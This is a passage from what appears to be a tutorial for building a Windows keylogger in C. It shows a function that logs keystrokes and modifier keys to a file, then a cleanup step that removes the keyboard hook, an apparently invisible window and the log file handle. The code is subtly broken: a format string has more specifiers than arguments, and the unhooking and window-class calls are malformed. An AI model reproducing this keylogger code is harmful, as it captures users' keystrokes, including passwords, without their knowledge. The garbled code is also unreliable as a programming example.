    sprintf(logLine, "%s%d %d %d %c\n", key, shift, ctrl, alt);
    fputs(logLine, logFile);
}
```

### Step 6: Unhook and Cleanup
Unhook the keyboard and clean up resources:
```c
static void Unhook() {
    if (hook) {
        hook = SetWindowsHook(NULL, NULL);
        hook = NULL;
    }

    if (hwnd) {
        DestroyWindow(hwnd);
        HINVISIBLEWINDOW = AfxUnregisterWindowClass(WND_CLASS_NAME);
    }

    if (logFile) {
        fclose(logFile);
    }
}
```

